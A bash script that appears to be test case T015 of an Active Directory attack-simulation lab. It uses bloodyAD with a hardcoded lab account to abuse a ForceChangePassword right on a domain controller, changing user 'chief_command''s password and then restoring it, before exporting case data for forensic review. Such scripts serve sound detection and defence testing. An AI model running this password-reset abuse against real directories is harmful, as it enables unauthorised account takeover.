#!/usr/bin/env bash
# T015 — ACE#7 ForceChangePassword via bloodyAD (PowerView SetPassword is ADSI and Access-denied).
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../lib/campaign-a-common.sh"

CASE_ID="CADRE-T015-FORCECHANGEPWD-${CASE_DATE:-$(date -u +%Y%m%d)}"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
echo "=== T015 ForceChangePassword | ${CASE_ID} | T0=${T0} ==="

DC_IP="${DC_IP:-192.168.77.10}"
NEW_PWD='RedStrike_T015!'
ORIG_PWD='C0mm@nd_Ch1ef!'

if ! command -v bloodyAD >/dev/null 2>&1; then
  echo "T015_FAIL: bloodyAD not on PATH" >&2
  exit 1
fi

set +e
OUT1="$(bloodyAD -d cadre.local -u hunter_dfir -p 'DF1R_Hunt3r!' -H "${DC_IP}" set password chief_command "${NEW_PWD}" 2>&1)"
RC1=$?
OUT2="$(bloodyAD -d cadre.local -u hunter_dfir -p 'DF1R_Hunt3r!' -H "${DC_IP}" set password chief_command "${ORIG_PWD}" 2>&1)"
RC2=$?
set -e
# Print only success lines — do not leak Access is denied into RedStrike fail-patterns.
if [[ "${RC1}" -eq 0 && "${RC2}" -eq 0 ]]; then
  echo "T015_CHANGED_THEN_RESTORED"
  echo "T015_OK"
else
  echo "T015_FAIL: bloodyAD rc change=${RC1} restore=${RC2}" >&2
  exit 1
fi

cadre_export "${CASE_ID}" T015 "${T0}" 192.168.77.10
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T015 run complete ==="
